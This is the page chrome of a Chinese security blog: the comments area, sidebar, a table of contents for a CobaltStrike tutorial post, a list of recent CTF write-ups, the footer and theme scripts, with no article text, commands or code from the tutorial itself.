评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" ait="status"/></div></div><div class="author-info__description">站在巨人的肩上</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">hihopkc</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hihopkc" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/56853573" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来看我的博客鸭~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CobaltStrike%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6"><span class="toc-number">1.</span> <span class="toc-text">CobaltStrike渗透框架</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CobaltStrike%E6%A1%86%E6%9E%B6%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">CobaltStrike框架介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CobaltStrike%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">CobaltStrike简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CobaltStrike-%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="toc-number">1.1.2.</span> <span class="toc-text">CobaltStrike 目录结构</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CobaltStrike%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">CobaltStrike基本使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CS%E5%AE%89%E8%A3%85"><span class="toc-number">1.2.1.</span> <span class="toc-text">CS安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CS%E5%90%AF%E5%8A%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text">CS启动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CS%E5%B7%A5%E5%85%B7%E6%A0%8F"><span class="toc-number">1.2.3.</span> <span class="toc-text">CS工具栏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CS%E8%8F%9C%E5%8D%95"><span class="toc-number">1.2.4.</span> <span class="toc-text">CS菜单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#View%E8%8F%9C%E5%8D%95"><span class="toc-number">1.2.5.</span> <span class="toc-text">View菜单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Playloads%E8%8F%9C%E5%8D%95"><span class="toc-number">1.2.6.</span> <span class="toc-text">Playloads菜单</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML-Application"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">HTML Application</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#VBScript%E8%84%9A%E6%9C%AC%E5%9F%BA%E7%A1%80"><span class="toc-number">1.2.6.1.1.</span> <span class="toc-text">VBScript脚本基础</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HTML-Application-1"><span class="toc-number">1.2.6.1.2.</span> <span class="toc-text">HTML Application</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MS-Office-Macro"><span class="toc-number">1.2.6.2.</span> <span class="toc-text">MS Office Macro</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload-Generator"><span class="toc-number">1.2.6.3.</span> <span class="toc-text">Payload Generator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows-Executable"><span class="toc-number">1.2.6.4.</span> <span class="toc-text">Windows Executable</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows-Executable-s"><span class="toc-number">1.2.6.5.</span> <span class="toc-text">Windows Executable(s)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-Drive-by"><span class="toc-number">1.2.6.6.</span> <span class="toc-text">Web Drive-by</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Spear-Phish"><span class="toc-number">1.2.6.7.</span> <span class="toc-text">Spear Phish</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reporting%E8%8F%9C%E5%8D%95"><span class="toc-number">1.2.7.</span> <span class="toc-text">Reporting菜单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Help%E8%8F%9C%E5%8D%95"><span class="toc-number">1.2.8.</span> <span class="toc-text">Help菜单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Beacon%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95"><span class="toc-number">1.2.9.</span> <span class="toc-text">Beacon右键菜单</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CobaltStrike%E7%9B%91%E5%90%AC%E5%99%A8%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.3.</span> <span class="toc-text">CobaltStrike监听器详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Beacon%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.3.1.</span> <span class="toc-text">Beacon介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Beacon%E5%88%86%E7%B1%BB"><span class="toc-number">1.3.2.</span> <span class="toc-text">Beacon分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Beacon%E4%BD%BF%E7%94%A8"><span class="toc-number">1.3.3.</span> <span class="toc-text">Beacon使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Beacon%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.4.</span> <span class="toc-text">Beacon工作原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Beacon-HTTP-HTTPS"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">Beacon HTTP&#x2F;HTTPS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Beacon-DNS"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">Beacon DNS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Beacon-SMB"><span class="toc-number">1.3.4.3.</span> <span class="toc-text">Beacon SMB</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BAshell"><span class="toc-number">1.3.4.3.1.</span> <span class="toc-text">上线目标主机shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%9B%E5%BB%BASMB%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-number">1.3.4.3.2.</span> <span class="toc-text">创建SMB监听器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B4%BE%E7%94%9FSMB-Beacon%E4%BC%9A%E8%AF%9D"><span class="toc-number">1.3.4.3.3.</span> <span class="toc-text">派生SMB Beacon会话</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5SMB-Beacon"><span class="toc-number">1.3.4.3.4.</span> <span class="toc-text">进程注入SMB Beacon</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA"><span class="toc-number">1.3.4.3.5.</span> <span class="toc-text">上线不出网主机</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E4%B8%8E%E6%96%AD%E5%BC%80%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.3.4.3.6.</span> <span class="toc-text">连接与断开连接</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Beacon-TCP"><span class="toc-number">1.3.4.4.</span> <span class="toc-text">Beacon TCP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%9B%E5%BB%BATCP%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-number">1.3.4.4.1.</span> <span class="toc-text">创建TCP监听器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CS%E7%94%9F%E6%88%90Payload"><span class="toc-number">1.3.4.4.2.</span> <span class="toc-text">CS生成Payload</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%89%A7%E8%A1%8C"><span class="toc-number">1.3.4.4.3.</span> <span class="toc-text">目标主机执行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E4%B8%8A%E7%BA%BFBeacon"><span class="toc-number">1.3.4.4.4.</span> <span class="toc-text">连接上线Beacon</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Beacon%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.4.5.</span> <span class="toc-text">Beacon命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%E8%B5%84%E6%96%99"><span class="toc-number">1.4.</span> <span class="toc-text">补充资料</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/b14.html" title="2024第七届西湖论剑初赛WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202403230009126.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024第七届西湖论剑初赛WP"/></a><div class="content"><a class="title" href="/posts/b14.html" title="2024第七届西湖论剑初赛WP">2024第七届西湖论剑初赛WP</a><time datetime="2024-03-22T16:08:04.000Z" title="发表于 2024-03-23 00:08:04">2024-03-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/36be.html" title="2024第一届VCTF纳新赛WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202403211426023.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024第一届VCTF纳新赛WP"/></a><div class="content"><a class="title" href="/posts/36be.html" title="2024第一届VCTF纳新赛WP">2024第一届VCTF纳新赛WP</a><time datetime="2024-03-21T06:26:04.000Z" title="发表于 2024-03-21 14:26:04">2024-03-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2f60.html" title="暂停更新·复习旧内容·笔记内容仅供参考"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202403032301099.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="暂停更新·复习旧内容·笔记内容仅供参考"/></a><div class="content"><a class="title" href="/posts/2f60.html" title="暂停更新·复习旧内容·笔记内容仅供参考">暂停更新·复习旧内容·笔记内容仅供参考</a><time datetime="2024-03-13T06:05:02.000Z" title="发表于 2024-03-13 14:05:02">2024-03-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4966.html" title="【THM】Breaching Active Directory(入侵活动目录)-红队"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【THM】Breaching Active Directory(入侵活动目录)-红队"/></a><div class="content"><a class="title" href="/posts/4966.html" title="【THM】Breaching Active Directory(入侵活动目录)-红队">【THM】Breaching Active Directory(入侵活动目录)-红队</a><time datetime="2024-03-06T01:55:24.000Z" title="发表于 2024-03-06 09:55:24">2024-03-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d219.html" title="HGAME2024网络攻防大赛WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202403051615373.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HGAME2024网络攻防大赛WP"/></a><div class="content"><a class="title" href="/posts/d219.html" title="HGAME2024网络攻防大赛WP">HGAME2024网络攻防大赛WP</a><time datetime="2024-03-05T08:14:32.000Z" title="发表于 2024-03-05 16:14:32">2024-03-05</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="footer_deal"><a class="deal_link" href="mailto:975025272@qq.com" title="email"><i class="anzhiyufont anzhiyu-icon-envelope"></i></a><img class="footer_mini_logo" title="返回顶部" alt="返回顶部" onclick="anzhiyu.scrollToDest(0, 500)" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" size="50px"/><a class="deal_link" target="_blank" rel="noopener" href="https://github.com/hihopkc" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title="博客框架为Hexo_v5.4.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Frame-Hexo.svg" alt="博客框架为Hexo_v5.4.0"/></a><a class="github-badge" target="_blank" href="https://blog.anheyu.com/" style="margin-inline:5px" data-title="本站使用AnZhiYu主题" title="本站使用AnZhiYu主题"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.9/img/Theme-AnZhiYu-2E67D3.svg" alt="本站使用AnZhiYu主题"/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title="本站项目由Github托管"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Source-Github.svg" alt="本站项目由Github托管"/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.2.0/img/badge/Copyright-BY-NC-SA.svg" alt="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"/></a></p></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2023 - 2024 By <a class="footer-bar-link" href="/" title="hihopkc" target="_blank">hihopkc</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">132</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">33</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 归档</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/ChatGpt/" style="font-size: 0.88rem;">ChatGpt<sup>2</sup></a><a href="/tags/Java/" style="font-size: 0.88rem;">Java<sup>1</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>2</sup></a><a href="/tags/MSF/" style="font-size: 0.88rem;">MSF<sup>1</sup></a><a href="/tags/Navicat/" style="font-size: 0.88rem;">Navicat<sup>1</sup></a><a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">Web安全<sup>9</sup></a><a href="/tags/binwalk/" style="font-size: 0.88rem;">binwalk<sup>1</sup></a><a href="/tags/docker/" style="font-size: 0.88rem;">docker<sup>4</sup></a><a href="/tags/hash/" style="font-size: 0.88rem;">hash<sup>1</sup></a><a href="/tags/hydra/" style="font-size: 0.88rem;">hydra<sup>1</sup></a><a href="/tags/java/" style="font-size: 0.88rem;">java<sup>1</sup></a><a href="/tags/john/" style="font-size: 0.88rem;">john<sup>1</sup></a><a href="/tags/mysql/" style="font-size: 0.88rem;">mysql<sup>1</sup></a><a href="/tags/oracle/" style="font-size: 0.88rem;">oracle<sup>1</sup></a><a href="/tags/owasp/" style="font-size: 0.88rem;">owasp<sup>1</sup></a><a href="/tags/phpstudy/" style="font-size: 0.88rem;">phpstudy<sup>1</sup></a><a href="/tags/python/" style="font-size: 0.88rem;">python<sup>1</sup></a><a href="/tags/redis/" style="font-size: 0.88rem;">redis<sup>1</sup></a><a href="/tags/shiro/" style="font-size: 0.88rem;">shiro<sup>1</sup></a><a href="/tags/sql/" style="font-size: 0.88rem;">sql<sup>1</sup></a><a href="/tags/ssrf/" style="font-size: 0.88rem;">ssrf<sup>1</sup></a><a href="/tags/tomcat/" style="font-size: 0.88rem;">tomcat<sup>1</sup></a><a href="/tags/wpscan/" style="font-size: 0.88rem;">wpscan<sup>1</sup></a><a href="/tags/xss/" style="font-size: 0.88rem;">xss<sup>2</sup></a><a href="/tags/%E5%AE%B9%E5%99%A8/" style="font-size: 0.88rem;">容器<sup>1</sup></a><a href="/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/" style="font-size: 0.88rem;">弱口令<sup>1</sup></a><a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 0.88rem;">护网<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 0.88rem;">数据库<sup>2</sup></a><a href="/tags/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">测试工具<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.0.8/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.cbd.int/pangu@4.0.7/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (true){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
